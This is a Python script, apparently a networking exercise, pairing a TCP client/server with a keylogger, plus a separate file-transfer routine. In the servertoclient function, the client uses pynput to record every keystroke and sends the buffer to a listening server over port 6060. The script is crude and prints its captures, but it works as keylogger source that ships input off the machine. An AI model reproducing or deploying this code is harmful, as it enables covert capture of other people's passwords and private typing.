import os
import socket
from pynput import keyboard

raw_data = []  # Global list to store captured keystrokes

def servertoclient():
    choice = input("Start as (1) Server or (2) Client? Enter 1 or 2: ").strip()
    host = socket.gethostname()
    port = 6060
    FORMAT = 'utf-8'
    HEADER = 97

    if choice == '1':  # Server
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.bind((host, port))
                server_socket.listen(1)
                print(f"Waiting for connection on {host}:{port}...")
                conn, cli_addr = server_socket.accept()

                print(f"Established connection with {cli_addr}")
                while True:
                    # Receive data from the client
                    data = conn.recv(1024)
                    if data:
                        print(f"Message received: {data.decode(FORMAT)}")
                    else:
                        print("No data received.")
                    
                    # Send acknowledgment to the client
                    message = "Acknowledged message"
                    conn.send(message.encode(FORMAT))
        except Exception as e:
            print(f"Server error: {e}")

    elif choice == '2':  # Client
        try:
            def on_press(key):
                """Capture keypress events and send them to the server."""
                try:
                    # Capture printable characters (e.g., letters, numbers, symbols)
                    raw_data.append(key.char)
                    print(f"Printable character: {key.char}")
                except AttributeError:
                    # Handle special keys (e.g., Enter, Shift, Ctrl, etc.)
                    raw_data.append(str(key))
                    print(f"Special key: {key}")

                # Convert the list of captured characters into a single string
                data_to_send = "".join(raw_data)

                # Send data to the server
                try:
                    client_socket.sendall(data_to_send.encode(FORMAT))
                    print(f"Data sent successfully: {data_to_send}")
                    raw_data.clear()  # Clear buffer after sending
                except Exception as e:
                    print(f"Error sending data: {e}")

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((host, port))
                print(f"Connected to server at {host}:{port}")

                # Send an initial message to the server
                msg = input("What do you want to send initially: ")
                message = msg.encode(FORMAT)
                msg_length = len(message)
                send_length = str(msg_length).encode(FORMAT)
                send_length += b' ' * (HEADER - len(send_length))
                client_socket.send(send_length)
                client_socket.send(message)

                # Print acknowledgment from the server
                print(client_socket.recv(2048).decode(FORMAT))

                # Start the keylogger
                with keyboard.Listener(on_press=on_press) as listener:
                    listener.join()

        except Exception as e:
            print(f"Error occurred: {e}")

    else:
        print("Invalid choice. Please choose 1 or 2.")


def file_transfer():
    """Simulate a file transfer between server and client."""
    choice = input("Start as (1) Server or (2) Client? Enter 1 or 2: ").strip()
    host = '127.0.0.1'
    port = 65433

    if choice == '1':  # Server
        default_directory = input("Enter the default directory for received files: ").strip()
        if not os.path.exists(default_directory):
            os.makedirs(default_directory)
            print(f"Directory '{default_directory}' created for storing received files.")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.bind((host, port))
                server_socket.listen(1)
                print(f"Waiting for connection on {host}:{port}...")
                conn, cli_addr = server_socket.accept()
                with conn:
                    print(f"Connected to client at {cli_addr}")
                    file_path = os.path.join(default_directory, "received_file.txt")
                    print("Saving file as 'received_file.txt'...")
                    with open(file_path, "wb") as f:
                        while True:
                            data = conn.recv(1024)
                            if not data:
                                break
                            f.write(data)
                    print(f"File received and saved as '{file_path}'.")
        except Exception as e:
            print(f"Server error: {e}")

    elif choice == '2':  # Client
        file_path = input("Enter the full path of the file to send: ").strip()

        if not os.path.isfile(file_path):
            print("File not found. Please check the file path.")
            return

        file_size = os.path.getsize(file_path)
        print(f"File to send: {file_path} ({file_size} bytes)")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((host, port))
                print(f"Connected to server at {host}:{port}")
                with open(file_path, "rb") as f:
                    while True:
                        data = f.read(1024)
                        if not data:
                            break
                        client_socket.sendall(data)
                print("File sent successfully.")
        except FileNotFoundError:
            print("File not found. Please check the file path.")
        except Exception as e:
            print(f"Error occurred: {e}")

    else:
        print("Invalid choice. Please choose 1 or 2.")

